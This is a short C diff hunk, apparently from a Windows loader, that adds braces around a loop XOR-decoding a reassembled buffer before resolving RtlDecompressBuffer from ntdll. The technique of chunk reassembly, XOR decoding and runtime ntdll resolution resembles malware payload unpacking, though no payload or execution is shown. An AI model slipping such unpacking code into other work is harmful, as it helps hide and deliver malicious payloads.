@@ -93,7 +93,9 @@ int main(int argc, char* argv[])
 	printf("[*] Reassembled %d chunks (%u bytes)\n", chunkCount, writeOffset);
 
 	for (size_t i = 0; i + 4 <= compressedSize; i += 4)
+	{
 		*(DWORD*)(concatenatedBuffer + 0x10 + i) ^= xorKey;
+	}
 
 	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 	fnRtlDecompressBuffer RtlDecompressBuffer = (fnRtlDecompressBuffer)GetProcAddress(hNtdll, "RtlDecompressBuffer");
